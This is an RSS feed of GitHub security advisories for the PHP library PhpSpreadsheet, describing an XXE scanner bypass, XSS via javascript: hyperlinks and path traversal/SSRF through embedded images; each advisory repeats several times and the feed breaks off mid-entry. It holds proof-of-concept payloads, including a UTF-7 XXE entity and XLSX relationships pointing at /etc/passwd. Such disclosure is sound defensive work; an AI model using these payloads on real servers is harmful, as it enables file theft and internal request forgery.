<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
    <title>Security Advisory for PHP packages hosted at packagist.org</title>
    <updated>2024-10-07T19:01:09.744Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
    <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] XXE in PHPSpreadsheet's XLSX reader]]></title>
        <id>https://github.com/advisories/GHSA-6hwr-6v2f-3m88</id>
        <link href="https://github.com/advisories/GHSA-6hwr-6v2f-3m88"/>
        <updated>2024-10-07T17:48:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The security scanner responsible for preventing XXE attacks in the XLSX reader can be bypassed by slightly modifying the XML structure, utilizing white-spaces. On servers that allow users to upload their own Excel (XLSX) sheets, Server files and sensitive information can be disclosed by providing a crafted sheet. </p>
<h3 id="details">Details</h3>
<p>The security scan function in <code>src/PhpSpreadsheet/Reader/Security/XmlScanner.php</code> contains a flawed XML encoding check to retrieve the input file's XML encoding in the <code>toUtf8</code> function. </p>
<p>The function searches for the XML encoding through a defined regex which looks for <code>encoding="*"</code> and/or <code>encoding='*'</code>, if not found, it defaults to the UTF-8 encoding which bypasses the conversion logic. </p>
<pre><code>$patterns = [
           '/encoding="([^"]*]?)"/',
           "/encoding='([^']*?)'/",
];
</code></pre>
<p>This logic can be used to pass a UTF-7 encoded XXE payload, by utilizing a whitespace before or after the <code>=</code> in the attribute definition. </p>
<h3 id="poc">PoC</h3>
<p>Needed:</p>
<ul>
<li>An Excel sheet (XLSX) with at least one cell containing a value.</li>
</ul>
<p>Unzip the excel sheet, and modify the <code>xl/SharedStrings.xml</code> file with the following value (note the space after <code>encoding=</code>):</p>
<pre><code>&lt;?xml version="1.0" encoding= 'UTF-7' standalone="yes"?&gt;
+ADw-!DOCTYPE abc [ ... ]&gt;
</code></pre>
<h4 id="step-by-step">Step-by-step</h4>
<ol>
<li>First off, the following string is encoded in base64:</li>
</ol>
<pre><code>&lt;!ENTITY internal 'abc'  &gt;" 
</code></pre>
<p>Resulting in:</p>
<pre><code>PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K
</code></pre>
<ol start="2">
<li>The string is used with a parameter entity and the PHP filter wrapper to ultimately define custom entities and call them within the XML.</li>
</ol>
<pre><code>&lt;?xml version="1.0" encoding= 'UTF-7' standalone="yes"?&gt;
+ADw-!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "php://filter//resource=data://text/plain;base64,PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K" &gt; %xxe;]&gt;
&lt;sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1"&gt;&lt;si&gt;&lt;t&gt;&amp;internal;&lt;/t&gt;&lt;/si&gt;&lt;/sst&gt;
</code></pre>
<p>When this file is parsed by the library, the value <code>abc</code> should be in the original filled cell.</p>
<p>With the help of the PHP filter wrapper, this can be escalated to information disclosure/file read. </p>
<h3 id="impact">Impact</h3>
<p>Sensitive information disclosure through the XXE on sites that allow users to upload their own excel spreadsheets, and parse them using PHPSpreadsheet's Excel parser.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c">https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331">https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf">https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf</a></li>
<li><a href="https://github.com/advisories/GHSA-6hwr-6v2f-3m88">https://github.com/advisories/GHSA-6hwr-6v2f-3m88</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6hwr-6v2f-3m88</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-07T15:58:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] XXE in PHPSpreadsheet's XLSX reader]]></title>
        <id>https://github.com/advisories/GHSA-6hwr-6v2f-3m88</id>
        <link href="https://github.com/advisories/GHSA-6hwr-6v2f-3m88"/>
        <updated>2024-10-07T17:48:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The security scanner responsible for preventing XXE attacks in the XLSX reader can be bypassed by slightly modifying the XML structure, utilizing white-spaces. On servers that allow users to upload their own Excel (XLSX) sheets, Server files and sensitive information can be disclosed by providing a crafted sheet. </p>
<h3 id="details">Details</h3>
<p>The security scan function in <code>src/PhpSpreadsheet/Reader/Security/XmlScanner.php</code> contains a flawed XML encoding check to retrieve the input file's XML encoding in the <code>toUtf8</code> function. </p>
<p>The function searches for the XML encoding through a defined regex which looks for <code>encoding="*"</code> and/or <code>encoding='*'</code>, if not found, it defaults to the UTF-8 encoding which bypasses the conversion logic. </p>
<pre><code>$patterns = [
           '/encoding="([^"]*]?)"/',
           "/encoding='([^']*?)'/",
];
</code></pre>
<p>This logic can be used to pass a UTF-7 encoded XXE payload, by utilizing a whitespace before or after the <code>=</code> in the attribute definition. </p>
<h3 id="poc">PoC</h3>
<p>Needed:</p>
<ul>
<li>An Excel sheet (XLSX) with at least one cell containing a value.</li>
</ul>
<p>Unzip the excel sheet, and modify the <code>xl/SharedStrings.xml</code> file with the following value (note the space after <code>encoding=</code>):</p>
<pre><code>&lt;?xml version="1.0" encoding= 'UTF-7' standalone="yes"?&gt;
+ADw-!DOCTYPE abc [ ... ]&gt;
</code></pre>
<h4 id="step-by-step">Step-by-step</h4>
<ol>
<li>First off, the following string is encoded in base64:</li>
</ol>
<pre><code>&lt;!ENTITY internal 'abc'  &gt;" 
</code></pre>
<p>Resulting in:</p>
<pre><code>PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K
</code></pre>
<ol start="2">
<li>The string is used with a parameter entity and the PHP filter wrapper to ultimately define custom entities and call them within the XML.</li>
</ol>
<pre><code>&lt;?xml version="1.0" encoding= 'UTF-7' standalone="yes"?&gt;
+ADw-!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "php://filter//resource=data://text/plain;base64,PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K" &gt; %xxe;]&gt;
&lt;sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1"&gt;&lt;si&gt;&lt;t&gt;&amp;internal;&lt;/t&gt;&lt;/si&gt;&lt;/sst&gt;
</code></pre>
<p>When this file is parsed by the library, the value <code>abc</code> should be in the original filled cell.</p>
<p>With the help of the PHP filter wrapper, this can be escalated to information disclosure/file read. </p>
<h3 id="impact">Impact</h3>
<p>Sensitive information disclosure through the XXE on sites that allow users to upload their own excel spreadsheets, and parse them using PHPSpreadsheet's Excel parser.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c">https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331">https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf">https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf</a></li>
<li><a href="https://github.com/advisories/GHSA-6hwr-6v2f-3m88">https://github.com/advisories/GHSA-6hwr-6v2f-3m88</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6hwr-6v2f-3m88</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-07T15:58:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] XXE in PHPSpreadsheet's XLSX reader]]></title>
        <id>https://github.com/advisories/GHSA-6hwr-6v2f-3m88</id>
        <link href="https://github.com/advisories/GHSA-6hwr-6v2f-3m88"/>
        <updated>2024-10-07T17:48:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The security scanner responsible for preventing XXE attacks in the XLSX reader can be bypassed by slightly modifying the XML structure, utilizing white-spaces. On servers that allow users to upload their own Excel (XLSX) sheets, Server files and sensitive information can be disclosed by providing a crafted sheet. </p>
<h3 id="details">Details</h3>
<p>The security scan function in <code>src/PhpSpreadsheet/Reader/Security/XmlScanner.php</code> contains a flawed XML encoding check to retrieve the input file's XML encoding in the <code>toUtf8</code> function. </p>
<p>The function searches for the XML encoding through a defined regex which looks for <code>encoding="*"</code> and/or <code>encoding='*'</code>, if not found, it defaults to the UTF-8 encoding which bypasses the conversion logic. </p>
<pre><code>$patterns = [
           '/encoding="([^"]*]?)"/',
           "/encoding='([^']*?)'/",
];
</code></pre>
<p>This logic can be used to pass a UTF-7 encoded XXE payload, by utilizing a whitespace before or after the <code>=</code> in the attribute definition. </p>
<h3 id="poc">PoC</h3>
<p>Needed:</p>
<ul>
<li>An Excel sheet (XLSX) with at least one cell containing a value.</li>
</ul>
<p>Unzip the excel sheet, and modify the <code>xl/SharedStrings.xml</code> file with the following value (note the space after <code>encoding=</code>):</p>
<pre><code>&lt;?xml version="1.0" encoding= 'UTF-7' standalone="yes"?&gt;
+ADw-!DOCTYPE abc [ ... ]&gt;
</code></pre>
<h4 id="step-by-step">Step-by-step</h4>
<ol>
<li>First off, the following string is encoded in base64:</li>
</ol>
<pre><code>&lt;!ENTITY internal 'abc'  &gt;" 
</code></pre>
<p>Resulting in:</p>
<pre><code>PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K
</code></pre>
<ol start="2">
<li>The string is used with a parameter entity and the PHP filter wrapper to ultimately define custom entities and call them within the XML.</li>
</ol>
<pre><code>&lt;?xml version="1.0" encoding= 'UTF-7' standalone="yes"?&gt;
+ADw-!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "php://filter//resource=data://text/plain;base64,PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K" &gt; %xxe;]&gt;
&lt;sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1"&gt;&lt;si&gt;&lt;t&gt;&amp;internal;&lt;/t&gt;&lt;/si&gt;&lt;/sst&gt;
</code></pre>
<p>When this file is parsed by the library, the value <code>abc</code> should be in the original filled cell.</p>
<p>With the help of the PHP filter wrapper, this can be escalated to information disclosure/file read. </p>
<h3 id="impact">Impact</h3>
<p>Sensitive information disclosure through the XXE on sites that allow users to upload their own excel spreadsheets, and parse them using PHPSpreadsheet's Excel parser.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c">https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331">https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf">https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf</a></li>
<li><a href="https://github.com/advisories/GHSA-6hwr-6v2f-3m88">https://github.com/advisories/GHSA-6hwr-6v2f-3m88</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6hwr-6v2f-3m88</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-07T15:58:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet HTML writer is vulnerable to Cross-Site Scripting via JavaScript hyperlinks]]></title>
        <id>https://github.com/advisories/GHSA-r8w8-74ww-j4wh</id>
        <link href="https://github.com/advisories/GHSA-r8w8-74ww-j4wh"/>
        <updated>2024-10-07T15:58:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>\PhpOffice\PhpSpreadsheet\Writer\Html</code> does not sanitize "javascript:" URLs from hyperlink <code>href</code> attributes, resulting in a Cross-Site Scripting vulnerability.</p>
<h3 id="poc">PoC</h3>
<p>Example target script:</p>
<pre><code>&lt;?php

require 'vendor/autoload.php';

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');

$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>Save this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15099763/book.xlsx">book.xlsx</a></p>
<p>Open index.php in a web browser and click on both links. The first demonstrates the vulnerability in a regular hyperlink and the second in a HYPERLINK() formula.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d">https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e">https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d">https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d</a></li>
<li><a href="https://github.com/advisories/GHSA-r8w8-74ww-j4wh">https://github.com/advisories/GHSA-r8w8-74ww-j4wh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r8w8-74ww-j4wh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T15:58:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet HTML writer is vulnerable to Cross-Site Scripting via JavaScript hyperlinks]]></title>
        <id>https://github.com/advisories/GHSA-r8w8-74ww-j4wh</id>
        <link href="https://github.com/advisories/GHSA-r8w8-74ww-j4wh"/>
        <updated>2024-10-07T15:58:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>\PhpOffice\PhpSpreadsheet\Writer\Html</code> does not sanitize "javascript:" URLs from hyperlink <code>href</code> attributes, resulting in a Cross-Site Scripting vulnerability.</p>
<h3 id="poc">PoC</h3>
<p>Example target script:</p>
<pre><code>&lt;?php

require 'vendor/autoload.php';

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');

$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>Save this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15099763/book.xlsx">book.xlsx</a></p>
<p>Open index.php in a web browser and click on both links. The first demonstrates the vulnerability in a regular hyperlink and the second in a HYPERLINK() formula.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d">https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e">https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d">https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d</a></li>
<li><a href="https://github.com/advisories/GHSA-r8w8-74ww-j4wh">https://github.com/advisories/GHSA-r8w8-74ww-j4wh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r8w8-74ww-j4wh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T15:58:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet HTML writer is vulnerable to Cross-Site Scripting via JavaScript hyperlinks]]></title>
        <id>https://github.com/advisories/GHSA-r8w8-74ww-j4wh</id>
        <link href="https://github.com/advisories/GHSA-r8w8-74ww-j4wh"/>
        <updated>2024-10-07T15:58:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>\PhpOffice\PhpSpreadsheet\Writer\Html</code> does not sanitize "javascript:" URLs from hyperlink <code>href</code> attributes, resulting in a Cross-Site Scripting vulnerability.</p>
<h3 id="poc">PoC</h3>
<p>Example target script:</p>
<pre><code>&lt;?php

require 'vendor/autoload.php';

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');

$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>Save this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15099763/book.xlsx">book.xlsx</a></p>
<p>Open index.php in a web browser and click on both links. The first demonstrates the vulnerability in a regular hyperlink and the second in a HYPERLINK() formula.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d">https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e">https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d">https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d</a></li>
<li><a href="https://github.com/advisories/GHSA-r8w8-74ww-j4wh">https://github.com/advisories/GHSA-r8w8-74ww-j4wh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r8w8-74ww-j4wh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T15:58:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows absolute path traversal and Server-Side Request Forgery in HTML writer when embedding images is enabled]]></title>
        <id>https://github.com/advisories/GHSA-w9xv-qf98-ccq4</id>
        <link href="https://github.com/advisories/GHSA-w9xv-qf98-ccq4"/>
        <updated>2024-10-07T15:58:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>It's possible for an attacker to construct an XLSX file that links images from arbitrary paths. When embedding images has been enabled in HTML writer with <code>$writer-&gt;setEmbedImages(true);</code> those files will be included in the output as <code>data:</code> URLs, regardless of the file's type. Also URLs can be used for embedding, resulting in a Server-Side Request Forgery vulnerability.</p>
<h3 id="details">Details</h3>
<p>XLSX files allow embedding or linking media. When </p>
<p>In <code>xl/drawings/drawing1.xml</code> an attacker can do e.g.:</p>
<pre><code class="language-xml">&lt;a:blip cstate="print" r:link="rId1" /&gt;
</code></pre>
<p>And then, in <code>xl/drawings/_rels/drawing1.xml.rels</code> they can set the path to anything, such as:</p>
<pre><code class="language-xml">&lt;Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="/etc/passwd" /&gt;
</code></pre>
<p>or</p>
<pre><code class="language-xml">&lt;Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="http://example.org" /&gt;
</code></pre>
<p>When the HTML writer is outputting the image, it does not check the path in any way. Also the <code>getimagesize()</code> call does not mitigate this, because when <code>getimagesize()</code> returns false, an empty mime type is used.</p>
<pre><code class="language-php">if ($this-&gt;embedImages || str_starts_with($imageData, 'zip://')) {
    $picture = @file_get_contents($filename);
    if ($picture !== false) {
        $imageDetails = getimagesize($filename) ?: ['mime' =&gt; ''];
        // base64 encode the binary data
        $base64 = base64_encode($picture);
        $imageData = 'data:' . $imageDetails['mime'] . ';base64,' . $base64;
    }
}

$html .= '&lt;img style="position: absolute; z-index: 1; left: '
    . $drawing-&gt;getOffsetX() . 'px; top: ' . $drawing-&gt;getOffsetY() . 'px; width: '
    . $drawing-&gt;getWidth() . 'px; height: ' . $drawing-&gt;getHeight() . 'px;" src="'
    . $imageData . '" alt="' . $filedesc . '" /&gt;';
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-php">&lt;?php

require 'vendor/autoload.php';

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');

$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
$writer-&gt;setEmbedImages(true);
$output = $writer-&gt;generateHTMLAll();

// The below is just for demo purposes

$pattern = '/data:;base64,(?&lt;data&gt;[^"]+)/i';

preg_match_all($pattern, $output, $matches);

print("*** /etc/passwd content: ***\n");
print(base64_decode($matches['data'][0]));

print("*** HTTP response content: ***\n");
print(base64_decode($matches['data'][1]));
</code></pre>
<p>Add this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15213066/book.xlsx">book.xlsx</a></p>
<p>Run with:
<code>php index.php</code></p>
<h3 id="impact">Impact</h3>
<p>When embedding images has been enabled, an attacker can read arbitrary files on the server and perform arbitrary HTTP GET requests, potentially e.g. <a href="https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/">revealing secrets</a>. Note that any PHP protocol wrappers can be used, meaning that if for example the <code>expect://</code> wrapper is enabled, also remote code execution is possible.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a">https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec">https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465">https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465</a></li>
<li><a href="https://github.com/advisories/GHSA-w9xv-qf98-ccq4">https://github.com/advisories/GHSA-w9xv-qf98-ccq4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w9xv-qf98-ccq4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T15:58:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows absolute path traversal and Server-Side Request Forgery in HTML writer when embedding images is enabled]]></title>
        <id>https://github.com/advisories/GHSA-w9xv-qf98-ccq4</id>
        <link href="https://github.com/advisories/GHSA-w9xv-qf98-ccq4"/>
        <updated>2024-10-07T15:58:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>It's possible for an attacker to construct an XLSX file that links images from arbitrary paths. When embedding images has been enabled in HTML writer with <code>$writer-&gt;setEmbedImages(true);</code> those files will be included in the output as <code>data:</code> URLs, regardless of the file's type. Also URLs can be used for embedding, resulting in a Server-Side Request Forgery vulnerability.</p>
<h3 id="details">Details</h3>
<p>XLSX files allow embedding or linking media. When </p>
<p>In <code>xl/drawings/drawing1.xml</code> an attacker can do e.g.:</p>
<pre><code class="language-xml">&lt;a:blip cstate="print" r:link="rId1" /&gt;
</code></pre>
<p>And then, in <code>xl/drawings/_rels/drawing1.xml.rels</code> they can set the path to anything, such as:</p>
<pre><code class="language-xml">&lt;Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="/etc/passwd" /&gt;
</code></pre>
<p>or</p>
<pre><code class="language-xml">&lt;Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="http://example.org" /&gt;
</code></pre>
<p>When the HTML writer is outputting the image, it does not check the path in any way. Also the <code>getimagesize()</code> call does not mitigate this, because when <code>getimagesize()</code> returns false, an empty mime type is used.</p>
<pre><code class="language-php">if ($this-&gt;embedImages || str_starts_with($imageData, 'zip://')) {
    $picture = @file_get_contents($filename);
    if ($picture !== false) {
        $imageDetails = getimagesize($filename) ?: ['mime' =&gt; ''];
        // base64 encode the binary data
        $base64 = base64_encode($picture);
        $imageData = 'data:' . $imageDetails['mime'] . ';base64,' . $base64;
    }
}

$html .= '&lt;img style="position: absolute; z-index: 1; left: '
    . $drawing-&gt;getOffsetX() . 'px; top: ' . $drawing-&gt;getOffsetY() . 'px; width: '
    . $drawing-&gt;getWidth() . 'px; height: ' . $drawing-&gt;getHeight() . 'px;" src="'
    . $imageData . '" alt="' . $filedesc . '" /&gt;';
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-php">&lt;?php

require 'vendor/autoload.php';

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');

$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
$writer-&gt;setEmbedImages(true);
$output = $writer-&gt;generateHTMLAll();

// The below is just for demo purposes

$pattern = '/data:;base64,(?&lt;data&gt;[^"]+)/i';

preg_match_all($pattern, $output, $matches);

print("*** /etc/passwd content: ***\n");
print(base64_decode($matches['data'][0]));

print("*** HTTP response content: ***\n");
print(base64_decode($matches['data'][1]));
</code></pre>
<p>Add this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15213066/book.xlsx">book.xlsx</a></p>
<p>Run with:
<code>php index.php</code></p>
<h3 id="impact">Impact</h3>
<p>When embedding images has been enabled, an attacker can read arbitrary files on the server and perform arbitrary HTTP GET requests, potentially e.g. <a href="https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/">revealing secrets</a>. Note that any PHP protocol wrappers can be used, meaning that if for example the <code>expect://</code> wrapper is enabled, also remote code execution is possible.</p>
<h3 id="references">References</h3>
<ul>
